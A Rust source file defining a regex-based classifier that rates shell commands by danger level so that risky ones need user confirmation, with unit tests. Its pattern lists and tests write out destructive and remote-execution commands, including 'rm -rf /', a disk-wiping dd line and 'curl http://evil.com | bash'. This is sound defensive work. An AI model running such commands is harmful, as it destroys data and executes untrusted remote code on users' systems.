//! Dangerous Command Classifier
//!
//! Pattern-based classification of shell commands by danger level.

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};

/// Danger level of a command
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DangerLevel {
    /// Safe to auto-execute
    Safe,
    /// Minor risk, show brief notification
    Moderate,
    /// Requires user confirmation
    Dangerous,
    /// Requires explicit acknowledgment
    Critical,
}

impl DangerLevel {
    /// Check if this level requires user confirmation
    pub fn requires_confirmation(&self) -> bool {
        matches!(self, DangerLevel::Dangerous | DangerLevel::Critical)
    }

    /// Get a description of the danger level
    pub fn description(&self) -> &'static str {
        match self {
            DangerLevel::Safe => "Safe to execute",
            DangerLevel::Moderate => "Low risk operation",
            DangerLevel::Dangerous => "Potentially destructive operation",
            DangerLevel::Critical => "Highly dangerous operation",
        }
    }
}

impl std::fmt::Display for DangerLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            DangerLevel::Safe => write!(f, "safe"),
            DangerLevel::Moderate => write!(f, "moderate"),
            DangerLevel::Dangerous => write!(f, "dangerous"),
            DangerLevel::Critical => write!(f, "critical"),
        }
    }
}

/// Result of command danger classification
#[derive(Debug, Clone)]
pub struct DangerClassification {
    pub level: DangerLevel,
    pub explanation: String,
    pub matched_patterns: Vec<String>,
    pub affected_resources: Vec<String>,
}

impl DangerClassification {
    /// Check if confirmation is required
    pub fn requires_confirmation(&self) -> bool {
        self.level.requires_confirmation()
    }
}

/// Pattern with description and danger level
struct DangerPattern {
    pattern: Regex,
    description: &'static str,
    level: DangerLevel,
}

impl DangerPattern {
    fn new(pattern: &str, description: &'static str, level: DangerLevel) -> Self {
        Self {
            pattern: Regex::new(pattern).expect("Invalid regex pattern"),
            description,
            level,
        }
    }
}

/// Critical patterns - system-breaking operations
static CRITICAL_PATTERNS: Lazy<Vec<DangerPattern>> = Lazy::new(|| {
    vec![
        DangerPattern::new(
            r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?(-[a-zA-Z]*f[a-zA-Z]*\s+)?/\s*$",
            "Recursive deletion of root filesystem",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?(-[a-zA-Z]*f[a-zA-Z]*\s+)?/\*",
            "Deletion of all files in root",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"mkfs\s",
            "Filesystem formatting",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"dd\s+.*of=/dev/[a-z]+",
            "Direct disk write",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r">\s*/dev/sd[a-z]",
            "Direct disk overwrite",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r":\(\)\s*\{\s*:\s*\|\s*:&\s*\}",
            "Fork bomb pattern",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"chmod\s+(-[a-zA-Z]*R[a-zA-Z]*\s+)?777\s+/\s*$",
            "Insecure permissions on root",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?(-[a-zA-Z]*f[a-zA-Z]*\s+)?~",
            "Deletion of home directory",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"\|\s*sh\s*$",
            "Piping to shell (potential remote code execution)",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"\|\s*bash\s*$",
            "Piping to bash (potential remote code execution)",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"curl\s+.*\|\s*(sh|bash)",
            "Downloading and executing script",
            DangerLevel::Critical,
        ),
        DangerPattern::new(
            r"wget\s+.*-O\s*-\s*\|\s*(sh|bash)",
            "Downloading and executing script",
            DangerLevel::Critical,
        ),
    ]
});

/// Dangerous patterns - data loss possible
static DANGEROUS_PATTERNS: Lazy<Vec<DangerPattern>> = Lazy::new(|| {
    vec![
        DangerPattern::new(
            r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*)",
            "Recursive deletion",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"rm\s+(-[a-zA-Z]*f[a-zA-Z]*)",
            "Force deletion",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"sudo\s+",
            "Elevated privileges",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"chmod\s+(-[a-zA-Z]*R[a-zA-Z]*)",
            "Recursive permission change",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"chown\s+(-[a-zA-Z]*R[a-zA-Z]*)",
            "Recursive ownership change",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"docker\s+system\s+prune",
            "Docker system cleanup",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"docker\s+rm\s+(-[a-zA-Z]*f[a-zA-Z]*)",
            "Force container removal",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"docker\s+rmi\s+(-[a-zA-Z]*f[a-zA-Z]*)",
            "Force image removal",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"podman\s+system\s+prune",
            "Podman system cleanup",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"podman\s+rm\s+(-[a-zA-Z]*f[a-zA-Z]*)",
            "Force container removal",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"git\s+push\s+.*--force",
            "Force git push",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"git\s+push\s+.*-f\b",
            "Force git push",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"git\s+reset\s+--hard",
            "Hard git reset",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"git\s+clean\s+(-[a-zA-Z]*f[a-zA-Z]*)",
            "Force git clean",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"DROP\s+TABLE",
            "SQL table drop",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"DROP\s+DATABASE",
            "SQL database drop",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"TRUNCATE\s+TABLE",
            "SQL table truncate",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r">\s*/etc/",
            "Write to system config",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"systemctl\s+(stop|disable|mask)",
            "Stop/disable system service",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"service\s+\S+\s+stop",
            "Stop system service",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"kill\s+(-[a-zA-Z]*9[a-zA-Z]*|SIGKILL)",
            "Force kill process",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"pkill\s+(-[a-zA-Z]*9[a-zA-Z]*)",
            "Force kill processes",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"killall\s+",
            "Kill all processes by name",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"reboot\b",
            "System reboot",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"shutdown\b",
            "System shutdown",
            DangerLevel::Dangerous,
        ),
        DangerPattern::new(
            r"init\s+[06]",
            "System runlevel change",
            DangerLevel::Dangerous,
        ),
    ]
});

/// Moderate patterns - may need manual recovery
static MODERATE_PATTERNS: Lazy<Vec<DangerPattern>> = Lazy::new(|| {
    vec![
        DangerPattern::new(r"mv\s+", "File/directory move", DangerLevel::Moderate),
        DangerPattern::new(
            r"cp\s+(-[a-zA-Z]*r[a-zA-Z]*)",
            "Recursive copy",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"docker\s+stop\s+",
            "Container stop",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"docker\s+rm\s+",
            "Container removal",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"podman\s+stop\s+",
            "Container stop",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"podman\s+rm\s+",
            "Container removal",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"git\s+checkout\s+",
            "Git checkout (may discard changes)",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"git\s+stash\s+drop",
            "Drop git stash",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"npm\s+install\s+",
            "NPM package installation",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"yarn\s+add\s+",
            "Yarn package installation",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"pip\s+install\s+",
            "Python package installation",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(
            r"cargo\s+install\s+",
            "Rust package installation",
            DangerLevel::Moderate,
        ),
        DangerPattern::new(r"rm\s+", "File deletion", DangerLevel::Moderate),
        DangerPattern::new(r"unlink\s+", "File unlink", DangerLevel::Moderate),
    ]
});

/// Classifier for dangerous commands
pub struct DangerClassifier {
    /// Additional user-defined patterns
    custom_patterns: Vec<DangerPattern>,
}

impl Default for DangerClassifier {
    fn default() -> Self {
        Self::new()
    }
}

impl DangerClassifier {
    /// Create a new classifier
    pub fn new() -> Self {
        Self {
            custom_patterns: Vec::new(),
        }
    }

    /// Add a custom pattern
    pub fn add_pattern(&mut self, pattern: &str, description: &str, level: DangerLevel) {
        if let Ok(regex) = Regex::new(pattern) {
            self.custom_patterns.push(DangerPattern {
                pattern: regex,
                description: Box::leak(description.to_string().into_boxed_str()),
                level,
            });
        }
    }

    /// Classify a command's danger level
    pub fn classify(&self, command: &str) -> DangerClassification {
        let command_lower = command.to_lowercase();
        let mut matched_patterns = Vec::new();
        let mut highest_level = DangerLevel::Safe;
        let mut explanations = Vec::new();

        // Check critical patterns first
        for pattern in CRITICAL_PATTERNS.iter() {
            if pattern.pattern.is_match(&command_lower) {
                if pattern.level as u8 > highest_level as u8 {
                    highest_level = pattern.level;
                }
                matched_patterns.push(pattern.pattern.as_str().to_string());
                explanations.push(pattern.description);
            }
        }

        // If not critical, check dangerous patterns
        if highest_level != DangerLevel::Critical {
            for pattern in DANGEROUS_PATTERNS.iter() {
                if pattern.pattern.is_match(&command_lower) {
                    if pattern.level as u8 > highest_level as u8 {
                        highest_level = pattern.level;
                    }
                    matched_patterns.push(pattern.pattern.as_str().to_string());
                    explanations.push(pattern.description);
                }
            }
        }

        // If not dangerous, check moderate patterns
        if highest_level != DangerLevel::Dangerous && highest_level != DangerLevel::Critical {
            for pattern in MODERATE_PATTERNS.iter() {
                if pattern.pattern.is_match(&command_lower) {
                    if pattern.level as u8 > highest_level as u8 {
                        highest_level = pattern.level;
                    }
                    matched_patterns.push(pattern.pattern.as_str().to_string());
                    explanations.push(pattern.description);
                }
            }
        }

        // Check custom patterns
        for pattern in &self.custom_patterns {
            if pattern.pattern.is_match(&command_lower) {
                if pattern.level as u8 > highest_level as u8 {
                    highest_level = pattern.level;
                }
                matched_patterns.push(pattern.pattern.as_str().to_string());
                explanations.push(pattern.description);
            }
        }

        DangerClassification {
            level: highest_level,
            explanation: explanations.join("; "),
            matched_patterns,
            affected_resources: extract_resources(command),
        }
    }
}

/// Extract file paths and other resources from a command
fn extract_resources(command: &str) -> Vec<String> {
    let path_pattern = Regex::new(r"(?:^|\s)(/[^\s]+|\.+/[^\s]+|~[^\s]*|[a-zA-Z]:\\[^\s]+)")
        .expect("Invalid path regex");

    path_pattern
        .captures_iter(command)
        .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let classifier = DangerClassifier::new();

        let safe_commands = vec!["ls -la", "pwd", "echo hello", "cat file.txt", "grep pattern file"];

        for cmd in safe_commands {
            let result = classifier.classify(cmd);
            assert_eq!(
                result.level,
                DangerLevel::Safe,
                "Command '{}' should be safe",
                cmd
            );
        }
    }

    #[test]
    fn test_dangerous_commands() {
        let classifier = DangerClassifier::new();

        let dangerous_commands = vec![
            "rm -rf /tmp/test",
            "sudo apt update",
            "git push --force",
            "chmod -R 777 /var",
        ];

        for cmd in dangerous_commands {
            let result = classifier.classify(cmd);
            assert!(
                result.level.requires_confirmation(),
                "Command '{}' should require confirmation",
                cmd
            );
        }
    }

    #[test]
    fn test_critical_commands() {
        let classifier = DangerClassifier::new();

        let critical_commands = vec![
            "rm -rf /",
            "rm -rf /*",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://evil.com | bash",
        ];

        for cmd in critical_commands {
            let result = classifier.classify(cmd);
            assert_eq!(
                result.level,
                DangerLevel::Critical,
                "Command '{}' should be critical",
                cmd
            );
        }
    }

    #[test]
    fn test_resource_extraction() {
        let resources = extract_resources("rm -rf /tmp/test /home/user/file.txt");
        assert!(resources.contains(&"/tmp/test".to_string()));
        assert!(resources.contains(&"/home/user/file.txt".to_string()));
    }
}
